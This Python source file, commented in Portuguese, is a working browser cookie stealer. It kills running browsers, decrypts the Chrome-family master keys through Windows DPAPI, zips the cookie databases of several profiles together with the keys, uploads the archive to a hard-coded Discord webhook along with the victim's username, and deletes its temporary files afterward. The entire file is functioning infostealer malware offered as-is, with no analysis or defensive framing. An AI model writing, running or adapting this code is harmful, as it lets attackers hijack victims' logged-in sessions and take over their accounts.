import base64
import json
import os
import random
import sqlite3
import zipfile
import requests
import psutil
from shutil import copy2
from getpass import getuser
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# CONFIGURAÇÃO
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562627473756258324/Aq_h-bGlSYRPFKhJMCyuhxmlSlUOa3RevLbkmgXAB_Ad4DOYsRi99-LmBWueKONJcHYC"

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            payload = {"content": f"📦 Cookies extraídos de: {getuser()}"}
            files = {"file": ("cookies.zip", f)}
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
    except Exception as e:
        print(f"Erro ao enviar: {e}")

def create_temp():
    tmp_dir = os.path.join(os.getenv('TEMP'), 'sys_cache')
    if not os.path.exists(tmp_dir):
        os.makedirs(tmp_dir)
    file_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))
    return os.path.join(tmp_dir, file_name)

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "msedge.exe", "vivaldi.exe"]
        
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        # fecha navegadores para liberar o arquivo de banco de dados (lock)
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in self.browser_exe:
                    proc.kill()
            except:
                pass

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None



    def grab_cookies(self):
        keys_file = os.path.join(os.getenv('TEMP'), 'keys.txt')
        if os.path.exists(keys_file): os.remove(keys_file)
        
        zip_path = os.path.join(os.getenv('TEMP'), 'cookies_data.zip')
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for name, path in self.browsers.items():
                if not os.path.isdir(path): continue

                master_key = self.get_master_key(os.path.join(path, 'Local State'))
                if not master_key:
                    continue

                with open(keys_file, 'a', encoding="utf-8") as kf:
                    kf.write(f"Browser: {name} | Key: {master_key.hex()}\n")

                for profile in self.profiles:
                    cookie_path = os.path.join(path, profile, 'Network', 'Cookies') if 'opera' not in name else os.path.join(path, 'Network', 'Cookies')
                    if os.path.isfile(cookie_path):
                        # Adiciona o arquivo de cookies ao zip com nome único
                        arc_name = f"{name}_{profile}_cookies.db"
                        zipf.write(cookie_path, arcname=arc_name)
            
            if os.path.exists(keys_file):
                zipf.write(keys_file, arcname='keys.txt')

        if os.path.exists(keys_file): os.remove(keys_file)
        return zip_path

def main():
    b = Browsers()
    zip_path = b.grab_cookies()

    if os.path.exists(zip_path):
        send_to_discord(zip_path)
        os.remove(zip_path)
if __name__ == "__main__":
    main()
